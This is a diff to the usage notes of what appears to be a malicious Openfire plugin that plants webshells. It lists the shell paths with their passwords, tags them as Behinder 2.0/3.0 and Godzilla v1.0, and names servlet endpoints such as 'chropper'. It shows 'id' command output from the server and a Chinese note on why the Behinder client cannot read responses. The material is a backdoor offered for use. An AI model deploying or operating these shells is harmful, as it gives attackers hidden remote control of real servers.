@@ -8,9 +8,9 @@ jdk1.6
 ```
 usages:
 
-/plugins/test/re2.jsp pass
-/plugins/re3.jsp rebeyond
-/plugins/god.jsp pass
+/plugins/test/re2.jsp pass 冰蝎2.0 
+/plugins/re3.jsp rebeyond 冰蝎3.0
+/plugins/god.jsp pass  哥斯拉v1.0
 
 /plugins/servlet/chropper?
 /plugins/servlet/test?
@@ -26,3 +26,6 @@ usages:
 uid=102(openfire) gid=105(openfire) groups=105(openfire)
 
 ```
+
+冰蝎由于请求的包返回在
+<div id="jive-main-content">标签内，客户端导致无法获取相关数据，提示“页面存在，但是无法获取秘钥”
